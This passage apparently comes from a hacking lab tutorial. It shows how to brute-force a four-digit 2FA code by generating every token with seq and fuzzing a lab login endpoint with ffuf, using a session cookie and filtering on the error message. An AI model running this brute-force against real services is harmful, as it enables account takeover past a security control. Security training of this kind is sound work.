## Attacking Two-Factor Authentication (2FA)

![](Brute-Forcing%202FA%20Codes-20260914-090501.png)

![](Brute-Forcing%202FA%20Codes-20260914-090546.png)

```sh
3kjS@htb[/htb]$ seq -w 0 9999 > tokens.txt
```

Afterward, we can use the following command to brute-force the correct TOTP by filtering out responses containing the `Invalid 2FA Code` error message:

```sh
3kjS@htb[/htb]$ ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"

<SNIP>
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 648ms]
    * FUZZ: 6513
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 635ms]
    * FUZZ: 6514

<SNIP>
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
    * FUZZ: 9999
```

As we can see, we get many hits. That is because our session successfully passed the 2FA check after we had supplied the correct TOTP. Since `6513` was the first hit, we can assume this was the correct TOTP.